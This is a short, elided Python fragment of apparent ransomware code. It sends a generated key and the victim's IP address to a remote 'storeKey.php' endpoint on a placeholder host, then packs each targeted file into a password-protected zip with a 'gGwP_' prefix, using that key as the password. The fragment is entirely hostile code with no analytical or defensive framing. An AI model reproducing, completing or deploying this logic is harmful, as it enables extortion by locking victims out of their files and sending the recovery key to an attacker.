...
try:
    ...
    data = requests.get("http://LinkHere/storeKey.php?str=" + finalKey + "&ip=" + ipAddr.text)
    ...
    if len(targetFList) > 0:
        ...
        for i in range(len(targetFList)):
            try:
                ...
                pyminizip.compress(targetDir  + targetFList[i], "", targetDir + "gGwP_" + randName + "_" + str(i + 1) + ".zip", finalKey, 0)
